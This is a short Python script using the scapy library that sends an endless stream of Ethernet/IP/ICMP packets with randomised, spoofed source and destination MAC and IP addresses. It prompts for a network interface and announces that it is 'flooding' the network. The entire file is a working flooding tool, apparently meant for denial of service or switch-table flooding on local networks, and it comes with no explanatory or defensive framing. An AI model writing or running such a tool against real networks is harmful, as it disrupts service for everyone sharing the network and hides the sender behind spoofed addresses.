from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from scapy.volatile import RandIP, RandMAC

packet = Ether(src=RandMAC("*:*:*:*:*:*"),
               dst=RandMAC("*:*:*:*:*:*")) / \
         IP(src=RandIP("*.*.*.*"),
            dst=RandIP("*.*.*.*")) / \
         ICMP()

dev = input("iface (Enter for none): ")

print("Flooding net with random packets on iface " + dev)

try:
    if dev == "":
        sendp(packet, loop=1, verbose=False)
    else:
        sendp(packet, iface=dev, loop=1, verbose=False)
except KeyboardInterrupt:
    print("Exit...")
    exit()
